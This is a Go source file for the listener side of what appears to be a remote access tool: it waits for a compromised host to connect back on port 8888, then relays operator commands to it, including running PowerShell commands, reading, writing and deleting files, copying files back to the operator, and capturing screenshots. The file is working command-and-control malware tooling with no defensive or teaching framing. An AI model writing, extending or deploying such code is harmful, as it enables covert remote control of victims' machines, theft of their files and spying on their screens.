package main

import (
	"bufio"
	"bytes"
	"fmt"
	"log"
	"net"
	"os"
	"strings"
)

var port string = ":8888"

func main() {
	config := readConfig("server.cfg")
	for _, kv := range config {
		key, value := kv[0], kv[1]
		switch key {
		case "port":
			port = value
		}
	}

	ln := startServer(port)

	conn, err := ln.Accept()
	if err != nil {
		log.Fatalf("Accept error: %v", err)
	}

	handleClient(conn)
}

func startServer(port string) (ln net.Listener) {
	ln, err := net.Listen("tcp", port)
	if err != nil {
		log.Fatalf("Listen error: %v", err)
	}

	fmt.Printf("Server started on port [%v]\n", port)
	return ln
}

func handleClient(conn net.Conn) {
	var addr string = conn.RemoteAddr().String()
	var data []byte

	fmt.Printf("\n    #### Host connected: %v ####\n\n", addr)

	for {
		conn.Write([]byte("pwd"))
		data = readConn(conn, 1024)
		fmt.Printf("%s>", data)

		scanner := bufio.NewScanner(os.Stdin)
		scanner.Scan()

		if err := scanner.Err(); err != nil {
			log.Fatalf("Scanner error: %v\n", err)
		}

		input := scanner.Text()
		cmd, args, _ := strings.Cut(input, " ")

		switch {
		case cmd == "":
		case cmd == "help":
			printCmdList()

		case cmd == "copy":
			conn.Write([]byte(input))
			writeBytesToFile(args, readConn(conn, 67108864))

		case cmd == "ss":
			conn.Write([]byte(input))
			writeBytesToFile("screenshot.png", readConn(conn, 67108864))

		default:
			conn.Write([]byte(input))
			fmt.Printf("%s\n", readConn(conn, 1024))
		}
	}
}

func printCmdList() {
	cmdList := [][]string{
		{"help", "Displays this help screen."},
		{"pwd", "Displays the working directory."},
		{"ls", "Displays contents of the working directory."},
		{"cd", "Changes the working directory, 'cd ..' to move up."},
		{"cat", "Display contents of a file."},
		{"ps", "Runs the specified powershell command."},
		{"touch", "Creates a file with the specified filename."},
		{"write", "Writes text to the specified file."},
		{"display", "Writes text to the specified file and opens the file."},
		{"remove", "Removes the specified file."},
		{"copy", "Copies the specified file."},
		{"ss", "Screenshots and saves the file."},
	}

	fmt.Print("\n")
	for _, cmd := range cmdList {
		fmt.Printf("    %-12v%v\n", cmd[0], cmd[1])
	}
	fmt.Print("\n")
}

func readConn(conn net.Conn, size int) (data []byte) {
	data = make([]byte, size)
	_, err := conn.Read(data)
	if err != nil {
		log.Fatalf("Read error: %v\n", err)
	}

	data = bytes.Trim(data, "\x00")
	return data
}

func writeBytesToFile(filename string, data []byte) {
	file, err := os.Create(filename)
	if err != nil {
		log.Fatalf("Create error: %v\n", err)
	}

	_, err = file.Write(data)
	if err != nil {
		log.Fatalf("Write error: %v\n", err)
	}

	err = file.Close()
	if err != nil {
		log.Fatalf("Close error: %v\n", err)
	}

	fmt.Printf("Written bytes to %v successfully.\n", filename)
}

func readConfig(name string) (config [][]string) {
	data, err := os.ReadFile(name)
	if err != nil {
		log.Fatalf("Read config error: %v\n", err)
	}

	lines := strings.Split(strings.ReplaceAll(string(data), "\r", ""), "\n")

	for _, line := range lines {
		keyValuePair := strings.Split(line, "=")
		if len(keyValuePair) == 2 {
			config = append(config, keyValuePair)
		}
	}

	return config
}
